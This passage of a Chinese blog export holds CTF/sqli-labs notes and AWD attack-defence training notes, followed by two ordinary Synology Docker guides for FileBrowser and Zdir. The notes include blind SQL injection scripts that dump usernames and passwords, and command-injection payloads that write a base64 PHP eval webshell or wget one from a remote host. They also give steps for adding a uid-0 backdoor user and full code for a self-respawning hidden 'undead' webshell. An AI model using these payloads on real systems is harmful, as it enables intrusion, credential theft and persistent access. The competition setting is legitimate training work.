class="line"><span class="comment"># 				column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 				print (a,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(group_concat)</span></span><br><span class="line"><span class="comment"># for b in xrange(1,50):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and if(ascii(substr((select group_concat(column_name) from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 		where table_name=&#x27;users&#x27;),%d,1))=%d,sleep(2),1) --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re4 = requests.get(url+pay4)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆数据</span></span><br><span class="line"><span class="comment"># for b in xrange(1,300):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay5 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and if(ascii(substr((select group_concat(username,&#x27; &#x27;,password) from users),%d,1))=%d,sleep(2),1) --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re5 = requests.get(url+pay5)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			flag = flag+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,flag)</span></span><br></pre></td></tr></table></figure>

<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>sqli-labs第27关</p>
<p>通过注册用户提交数据给数据库，再点击查看数据从数据库里取出数据显示出来。如果第一步存数据没有做到足够过滤，第二步的显示则存在注入漏洞。</p>
<p>首先测试正常名字，显示正常。再尝试单引号闭合后面加个sleep，发现不再显示且有延迟。之后union查询即可。</p>
<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h2 id="限制命令长度-lt-8"><a href="#限制命令长度-lt-8" class="headerlink" title="限制命令长度&lt;8"></a>限制命令长度&lt;8</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>写<code>cat</code>，<code>*</code>匹配：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=&gt;<span class="built_in">cat</span></span><br><span class="line">?cmd=* ../*</span><br></pre></td></tr></table></figure>

<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>base64加密一句话木马：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>

<p>要传入的命令即：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|<span class="built_in">base64</span> -d&gt;1.php</span><br></pre></td></tr></table></figure>

<p>然后分段传入，注意特殊字符要加转义符。最后执行<code>ls -t&gt;0</code>，即按创建逆序依次写入文件<code>0</code>中，最后<code>sh 0</code>即可在同级目录下建好一句话木马文件<code>1.php</code>。</p>
<p>payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;==\\</span><br><span class="line">&gt;pOw\\</span><br><span class="line">&gt;MV0\\</span><br><span class="line">&gt;1Rb\\</span><br><span class="line">&gt;BPU\\</span><br><span class="line">&gt;kX1\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>

<h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p>与方法2类似，不过一句话木马不再echo写入，而是通过wget远程获取本机写好的木马。</p>
<p>payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?1=&gt;hp</span><br><span class="line">?1=&gt;ell.p\\</span><br><span class="line">?1=&gt;\ sh\\</span><br><span class="line">?1=&gt;\ -O\\</span><br><span class="line">?1=&gt;com\\</span><br><span class="line">?1=&gt;x.\\</span><br><span class="line">?1=&gt;\ xx\\</span><br><span class="line">?1=&gt;wget\\</span><br><span class="line">?1=<span class="built_in">ls</span> -t&gt;a</span><br><span class="line">?1=sh a</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全5x01】洞明科技网络安全红蓝对抗培训 --- day1</title>
    <url>/1096/</url>
    <content><![CDATA[<p>看来这网络安全是没完了，又搞护网、攻防、培训。一群门外汉，搞点小儿科，不知意义有多大。专业的事情交给专业的厂家来做不是更合适吗。</p>
<p>本来去年比赛拿第一之后我已经算是毕业了，我也对这个完全丧失兴趣了。是时候该去找新事物了。</p>
<p>新买了把机械键盘，正好试键盘，敲一点明天AWD的笔记给小伙伴用。</p>
<span id="more"></span>

<h1 id="AWD笔记"><a href="#AWD笔记" class="headerlink" title="AWD笔记"></a>AWD笔记</h1><h2 id="防守"><a href="#防守" class="headerlink" title="防守"></a>防守</h2><h3 id="1-改密码"><a href="#1-改密码" class="headerlink" title="1.改密码"></a>1.改密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@[ip]:[port]   <span class="comment">#ssh登录靶机</span></span><br><span class="line"></span><br><span class="line">sudo passwd root       <span class="comment">#修改root用户密码</span></span><br></pre></td></tr></table></figure>

<h3 id="2-删用户"><a href="#2-删用户" class="headerlink" title="2.删用户"></a>2.删用户</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd     <span class="comment">#看最后一行,</span></span><br><span class="line">deluser [user]      <span class="comment">#有奇怪的用户就删掉</span></span><br><span class="line"></span><br><span class="line">控制面板 - 用户账户 - 删除用户账户   <span class="comment">#win系统删用户方法</span></span><br></pre></td></tr></table></figure>

<h3 id="3-踢人"><a href="#3-踢人" class="headerlink" title="3.踢人"></a>3.踢人</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w                  <span class="comment">#显示现在在线的人</span></span><br><span class="line">ps -ef | grep ssh  <span class="comment">#如果有其它用户或者ip，就找到这个进程的[pid]</span></span><br><span class="line"><span class="built_in">kill</span> -9 [pid]      <span class="comment">#杀掉进程</span></span><br></pre></td></tr></table></figure>

<h3 id="4-备份网站"><a href="#4-备份网站" class="headerlink" title="4.备份网站"></a>4.备份网站</h3><p>使用ftp下载<code>/var/www/html/</code>目录到本地，然后启动<strong>cnseay</strong>工具扫网站漏洞后门。</p>
<h3 id="5-修漏洞"><a href="#5-修漏洞" class="headerlink" title="5.修漏洞"></a>5.修漏洞</h3><p><code>ma.php</code>这种预先放在目录下的后门，直接从ftp删除即可，其它的根据扫完情况再说。</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="1-登对方靶机"><a href="#1-登对方靶机" class="headerlink" title="1.登对方靶机"></a>1.登对方靶机</h3><p>如果密码公开，抢先登录对方靶机，添加用户<code>config</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduser config</span><br><span class="line"><span class="comment">#密码随便输两遍，其它全部回车</span></span><br></pre></td></tr></table></figure>

<p>使用vim修改用户组为0：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/passwd</span><br></pre></td></tr></table></figure>
<p>修改前<code>config:x:1001:1002:,,,:/home/config:/bin/bash</code></p>
<p>修改后<code>config:x:0:1002:,,,:/home/config:/bin/bash</code></p>
<h3 id="2-连接对方预先放置的后门"><a href="#2-连接对方预先放置的后门" class="headerlink" title="2.连接对方预先放置的后门"></a>2.连接对方预先放置的后门</h3><p>地址：http:&#x2F;&#x2F;[ip]:[port]&#x2F;ma.php</p>
<p>密码：cmd</p>
<p>连上去赶紧传不死马，<code>/var/www/html/</code>下各个目录随便传，越多越好。名字也要做好隐蔽,我一般常用<code>.config.php</code>，<code>.index.php</code>，<code>.struct.php</code>等等这种，前面加<code>.</code>表示隐藏。</p>
<p>不死马是指一个不停生成木马后门的木马，一旦执行，删文件没有用，必须要删进程才行。</p>
<p>这货长这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$shell</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>万一对手也会玩了，那就执行这个文件这样杀：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#@unlink(&#x27;config.php&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;ps aux|grep www-data|grep -v grep|awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27;|xargs kill -9&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-随意玩了"><a href="#3-随意玩了" class="headerlink" title="3.随意玩了"></a>3.随意玩了</h3><p>有且不只有后台弱口令、sql注入、文件包含、文件上传、命令执行、xss等漏洞，这个根据扫出来的情况随意玩了</p>
<p>不过其实种好不死马，就已经可以稳定获取flag了</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【群晖NAS瞎折腾】docker安装FileBrowser</title>
    <url>/1100/</url>
    <content><![CDATA[<p>FileBrowser是一个文件浏览器，用来帮助我们利用web网页端管理linux服务器上的文件。这里有人就要说了，群晖本来不就是干文件管理的吗，在群晖上再安装一个这个不是脱裤子放屁吗？<br>这里我安装FileBrowser的理由是，当把群晖根目录挂载到FileBrowser后，我们可以直接对一些在群晖网页端隐藏的文件进行操作。<br>例如对docker容器里文件进行操作，一般需要xshell或者finalshell连接到群晖控制台，再进入docker操作。而安装了FileBrowser后，我们可以轻松定位到目录，通过上传下载来替换文件，一些源码的简单修改也可以直接在web端解决。<br>本文在群晖DSM7.0.1下利用docker安装最新版FileBrowser。</p>
<span id="more"></span>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
<li>Docker注册表搜索FileBrowser，选择<code>filebrowser/filebrowser:latest</code>下载映像。</li>
</ol>
<p><img src="/1100/1.png"></p>
<ol start="2">
<li>由于在Docker的web端不能挂载群晖根目录，所以这个容器需要远程连接到群晖控制台利用root权限命令启动。</li>
</ol>
<p>使用finalshell连接到群晖控制台，切换到root用户，<code>docker images</code>查看下载好的镜像。</p>
<p><img src="/1100/2.png"></p>
<ol start="3">
<li>接下来新建配置文件及目录</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /volume1/docker/filebrowser</span><br><span class="line"><span class="built_in">touch</span> /volume1/docker/filebrowser/filebrowser.db</span><br><span class="line"><span class="built_in">touch</span> /volume1/docker/filebrowser/settings.json</span><br></pre></td></tr></table></figure>

<p>首先新建配置文件目录，这个目录待会要挂载到容器的配置目录。</p>
<p>新建两个空文件，<code>.db</code>的数据库保持空文件即可，<code>vi</code>编辑<code>.json</code>文件，下面是官方给的缺省配置，直接复制即可，编辑完<code>:wq</code>保存退出。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">80</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;baseURL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;log&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stdout&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/database/filebrowser.db&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;root&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/srv&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1100/3.png"></p>
<ol start="4">
<li>然后配置启动参数</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name=filebrowser \</span><br><span class="line">-e PUID=<span class="variable">$UID</span> \</span><br><span class="line">-e PGID=<span class="variable">$GID</span> \</span><br><span class="line">-p 8082:80 \</span><br><span class="line">-v /volume1/docker/filebrowser/filebrowser.db:/database/filebrowser.db \</span><br><span class="line">-v /volume1/docker/filebrowser/settings.json:/config/settings.json \</span><br><span class="line">-v /:/srv \</span><br><span class="line">filebrowser/filebrowser:latest</span><br></pre></td></tr></table></figure>

<p>其中第一行<code>--name=</code>指定容器名称，<code>-p</code>表示容器由外部8082端口映射到内部80端口，<code>-v</code>分别挂载两个配置文件以及文件主目录<code>/</code>到容器的根目录<code>/srv</code>，最后一行是使用的镜像名称及版本TAG。</p>
<p>执行完毕后可以看到容器已启动：</p>
<p><img src="/1100/4.png"></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>访问对应地址的8082端口，在设置处修改中文及密码：</p>
<p><img src="/1100/5.png"></p>
<p>这时在主页可以看到群晖系统的根目录，后续修改系统文件、docker文件都会方便很多。</p>
<p><img src="/1100/6.png"></p>
<p>FileBrowser还支持代码高亮，编辑html和php很是方便。</p>
<p><img src="/1100/7.png"></p>
<p>除此外，还能播放音乐、视频等，实测响应速度是比群晖自带文件管理器要快的。</p>
<p><img src="/1100/8.png"></p>
<p>最后也可以在群晖docker里看见这个容器，可以先把它停止一下，在编辑里把自动重启功能打开，避免崩溃后用不了。</p>
<p><img src="/1100/9.png"></p>
<p>如果按照我的配置文件配置了这个文件管理器，我强烈不建议长期开启，因为直接把群晖的系统文件挂载到了这个里，风险太高，尤其暴露在公网环境的话更是要做好安全措施。我这里就是按需启用，平常都是关闭的。</p>
]]></content>
      <tags>
        <tag>群晖</tag>
        <tag>docker</tag>
        <tag>FileBrowser</tag>
      </tags>
  </entry>
  <entry>
    <title>【群晖NAS瞎折腾】docker安装Zdir网盘</title>
    <url>/1101/</url>
    <content><![CDATA[<p>Zdir是一款使用PHP开发的目录列表程序，无需数据库，安装简单，使用方便。</p>
<p>这个程序主要有目录浏览、文件索引、文件搜索、文本查看(代码高亮)、图片预览等功能。</p>
<p>这时又会有人说了，群晖里装文件管理，脱裤子放屁x2。</p>
<p>我安装它的理由是，当需要共享一些文件时（比如软件安装包、系统镜像等），我需要方便快捷的无加密共享出去，同时文件比较多的时候能直接目录搜索。如果每次都要登录群晖创建分享链接，那简直太累了。</p>
<p>这个网盘建好之后我使用起来更像是一个无加密的共享ftp服务器（当然可以设置访问密码）。</p>
<p>本文在群晖DSM7.0.1下利用docker安装最新版Zdir网盘，并对原作者的牛皮癣广告进行处理（我尊重开源，勿杠）。</p>
<span id="more"></span>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
<li>Docker注册表搜索Zdir，选择<code>helloz/zdir:latest</code>下载映像。</li>
</ol>
<p><img src="/1101/1.png"></p>
<ol start="2">
<li>找到映像，启动并配置高权限及自动重启。</li>
</ol>
<p><img src="/1101/2.png"></p>
<ol start="3">
<li>存储空间点击添加文件夹，选择本地想要分享出去的文件夹，然后在装载路径处填写<code>/data/wwwroot/default/xxx</code>，其中xxx是容器根目录下你给挂载文件夹起的名字。</li>
</ol>
<p><img src="/1101/3.png"></p>
<ol start="4">
<li>配置端口转发，容器端口80不变，外部端口选择自己喜欢的，建议大一点不容易被扫到。</li>
</ol>
<p><img src="/1101/4.png"></p>
<ol start="5">
<li>配置完毕后启动，访问可以看到原作者留下的满屏牛皮癣（滑稽）。</li>
</ol>
<p><img src="/1101/5.png"></p>
<p>接下来我们来改源码，定制一些个人元素上去。</p>
<h1 id="修改源码"><a href="#修改源码" class="headerlink" title="修改源码"></a>修改源码</h1><h2 id="去滚动广告"><a href="#去滚动广告" class="headerlink" title="去滚动广告"></a>去滚动广告</h2><p>finalshell连接到群晖后，查看zdir容器名称，然后进入容器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker <span class="built_in">exec</span> -it f279f2566efc /bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="/1101/6.png"></p>
<p>编辑<code>/data/wwwroot/default/zdir/functions/home.php</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /data/wwwroot/default/zdir/functions/home.php</span><br></pre></td></tr></table></figure>

<p>按<code>dd</code>依次删掉126-131行内容：</p>
<p><img src="/1101/7.png"></p>
<p>此时滚动广告已经没有了。</p>
<h2 id="修改标题、密码"><a href="#修改标题、密码" class="headerlink" title="修改标题、密码"></a>修改标题、密码</h2><p>编辑<code>/data/wwwroot/default/zdir/config.php</code>文件可以修改标题及密码。</p>
<p>我们可以像上面的方式来修改，但是由于容器对中文支持不好，所以我们也可以使用前文安装的FileBrowser来优雅的进行修改（滑稽）。</p>
<p>首先全局搜索一下zdir容器在群晖中的目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name zdir</span><br></pre></td></tr></table></figure>

<p>得到zdir容器的路径：<code>/volume1/@docker/volumes/6f99aef8395fb3fb7b3bce5025b57fd3a75d20520d1139342967ab52a7bd9351/_data/zdir</code></p>
<p><img src="/1101/8.png"></p>
<p>接着用FileBrowser访问zdir容器目录：</p>
<p><img src="/1101/9.png"></p>
<p>接下来就可以优雅的修改<code>config.php</code>了：</p>
<p><img src="/1101/10.png"></p>
<p>我这里修改了网站名字及标题，下面忽略目录列表里添加了<code>@eaDir</code>这个群晖自动生成的隐藏文件夹，最下面设置管理账号密码，如果要启用访问密码记得把FALSE改成TRUE。</p>
<p>保存退出，网站标题就改好了。</p>
<h2 id="修改顶部目录"><a href="#修改顶部目录" class="headerlink" title="修改顶部目录"></a>修改顶部目录</h2><p>顶部目录文件源码在<code>zdir/template/header.php</code>里：</p>
<p><img src="/1101/11.png"></p>
<p>简单的跳转，前面<code>&lt;a href=</code>指链接，后面跟页面显示内容。</p>
<p>不想要的直接<code>&lt;!--</code>和<code>--&gt;</code>注释掉即可。</p>
<p>保存退出，顶部目录就改好了。</p>
<h2 id="修改底部内容"><a href="#修改底部内容" class="headerlink" title="修改底部内容"></a>修改底部内容</h2><p>顶部目录文件源码在<code>zdir/template/footer.php</code>里：</p>
<p><img src="/1101/12.png"></p>
<p>修改完保存退出即可。</p>
<p>修改完最后的整体效果：</p>
<p><img src="/1101/13.png"></p>
]]></content>
      <tags>
        <tag>群晖</tag>
        <tag>docker</tag>
        <tag>Zdir</tag>
      </tags>
  </entry>
</search>
